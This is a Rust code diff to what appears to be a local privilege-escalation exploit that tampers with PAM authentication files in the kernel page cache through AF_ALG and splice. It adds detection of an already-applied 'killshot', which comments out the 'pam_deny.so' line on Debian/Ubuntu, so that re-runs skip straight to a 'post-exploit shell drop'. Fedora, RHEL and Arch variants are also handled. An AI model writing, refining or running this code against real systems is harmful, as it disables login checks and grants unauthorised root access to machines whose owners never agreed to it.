@@ -201,6 +201,44 @@ fn line_contains(line: &[u8], needle: &[u8]) -> bool {
     line.windows(needle.len()).any(|w| w == needle)
 }
 
+// FIX 2 (idempotent re-run): detect a `#aut\trequisite ... pam_deny.so` line —
+// the result of a prior killshot in the page cache. Returns the absolute
+// offset of the `#` byte if present, None otherwise.
+//
+// This scanner is the inverse of `for_each_uncommented_auth_line`: it looks
+// for lines whose first non-whitespace byte is `#` and whose first 4 bytes
+// match the killshot signature `#aut`.
+pub fn find_pam_deny_killshot_offset(content: &[u8]) -> Option<usize> {
+    let mut i = 0;
+    while i < content.len() {
+        let line_start = i;
+        let line_end = match content[i..].iter().position(|&b| b == b'\n') {
+            Some(p) => i + p,
+            None => content.len(),
+        };
+        let raw = &content[line_start..line_end];
+        let mut j = 0;
+        while j < raw.len() && (raw[j] == b' ' || raw[j] == b'\t') { j += 1; }
+        let token_off = line_start + j;
+        let rest = &raw[j..];
+        if rest.len() > 4 && &rest[..4] == b"#aut" {
+            // Reviewer M1: tighten to `\t` only. The killshot replaces `auth`
+            // with `#aut` inside the canonical `auth\trequisite\t\t\tpam_deny.so`
+            // line — the byte after `#aut` is therefore always a tab. This
+            // rejects hand-written comments like `#aut something requisite ...
+            // pam_deny.so` that would otherwise false-positive.
+            if rest[4] == b'\t'
+                && line_contains(rest, b"requisite")
+                && line_contains(rest, b"pam_deny.so")
+            {
+                return Some(token_off);
+            }
+        }
+        i = line_end + 1;
+    }
+    None
+}
+
 // ----- Buffer construction -----
 
 // Copy `original` into `out`, apply mutation, pad length to multiple of 4.
@@ -326,7 +364,13 @@ impl Vector for PamVector {
         };
         let content = &buf[..n];
         let found = match self.family {
-            DistroFamily::DebianUbuntu => find_pam_deny_line_offset(content).is_some(),
+            // FIX 2: applicable in both fresh and already-killshotted state
+            // (re-run idempotency). execute() detects the post-mutation case
+            // and skips the AF_ALG work.
+            DistroFamily::DebianUbuntu => {
+                find_pam_deny_line_offset(content).is_some()
+                    || find_pam_deny_killshot_offset(content).is_some()
+            }
             DistroFamily::FedoraRhel | DistroFamily::Arch => {
                 find_fedora_default_bad_offset(content).is_some()
                     && find_fedora_faillock_authfail_line_offset(content).is_some()
@@ -343,6 +387,16 @@ impl Vector for PamVector {
         let mut content = [0u8; FILE_BUF];
         let content_len = read_file_to_buf(target, &mut content).ok_or(Error::OpenFailed)?;
         let original = &content[..content_len];
+
+        // FIX 2: idempotent re-run. If a prior killshot is already visible in
+        // the page cache (Debian/Ubuntu), skip the AF_ALG/splice work and
+        // return Ok. The caller still proceeds to the post-exploit shell drop
+        // because the bypass is already active.
+        if matches!(self.family, DistroFamily::DebianUbuntu)
+            && find_pam_deny_killshot_offset(original).is_some()
+        {
+            return Ok(());
+        }
 
         // Build patched buffer per family.
         let mut patched = [0u8; FILE_BUF];
